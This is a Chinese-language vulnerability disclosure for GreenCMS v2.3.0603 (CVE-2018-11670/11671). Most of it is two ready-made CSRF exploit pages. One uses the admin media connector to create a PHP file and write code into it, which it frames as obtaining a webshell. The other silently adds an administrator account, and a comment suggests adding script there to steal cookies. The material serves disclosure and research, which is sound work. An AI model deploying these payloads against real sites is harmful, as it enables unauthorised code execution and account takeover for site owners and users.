### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|GreenCMS v2.3.0603存在CSRF漏洞可获取webshell&增加管理员账户|2018-06-02|惜潮|[https://github.com/GreenCMS/GreenCMS](https://github.com/GreenCMS/GreenCMS) | [https://github.com/GreenCMS/GreenCMS](https://github.com/GreenCMS/GreenCMS) |v2.3.0603| [CVE-2018-11670](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11670)/[CVE-2018-11671](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11671)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个Html页面 从而获取网站webshell。GreenCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/GreenCMS/GreenCMS/issues/108)/[issues](https://github.com/GreenCMS/GreenCMS/issues/109)告知作者。   


### POC实现代码如下：  

> 从CSRF到get webshell 的exp代码如下：  

``` html
<span style="font-size:18px;"><!DOCTYPE html> 
<html lang="en"> 
<head> 
    <meta charset="UTF-8"> 
    <title>csrf测试</title> 
</head> 
<form action="http://127.0.0.1//14/index.php?m=admin&c=media&a=fileconnect" method="POST" id="transfer" name="transfer">
    <!-- 下面的是生成文件名为xc.php的脚本文件 路径 127.0.0.1/Upload/xc.php -->
    <script src="http://127.0.0.1/14/index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=xc.php&target=l1_XA&_=1527839615462"></script>
    <input type="hidden" name="cmd" value="put">
    <input type="hidden" name="target" value="l1_eGMucGhw">
　    <input type="hidden" name="content" value="<?php phpinfo();?>">
    <!-- 下面的是提交表单 将content中的命令写入脚本内 -->
    <button type="submit" value="Submit">WebShell</button>
    </form>
    </body>
</html></span>
```
> 从CSRF到增加管理员 的exp代码如下：  

``` html
<span style="font-size:18px;"><!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <title>csrf测试</title>  
</head>  
　　<body>  
    　　　　<form action="http://127.0.0.1//14/index.php?m=admin&c=access&a=adduserhandle" method="POST" id="transfer" name="transfer">  
　　　　　　　　<input type="hidden" name="user_id0" value="1">  
　　　　　　　　<input type="hidden" name="user_login" value="test1">  <!--在这里可以添加JS脚本用于获取cookies  csrf+xss-->
　　　　　　　　<input type="hidden" name="password" value="test1">  
　　　　　　　　<input type="hidden" name="rpassword" value="test1">  
　　　　　　　　<input type="hidden" name="user_nicename" value="123">  
　　　　　　　　<input type="hidden" name="user_email" value="123%40Qq.com">  
　　　　　　　　<input type="hidden" name="user_url" value="www.baidu.com">  
　　　　　　　　<input type="hidden" name="user_intro" value="test">  
　　　　　　　　<input type="hidden" name="user_status" value="1">  
　　　　　　　　<input type="hidden" name="role_id" value="1">
        <button type="submit" value="Submit">添加管理员</button>  
　　　　　　</form>  
    </body>
</html></span>
```
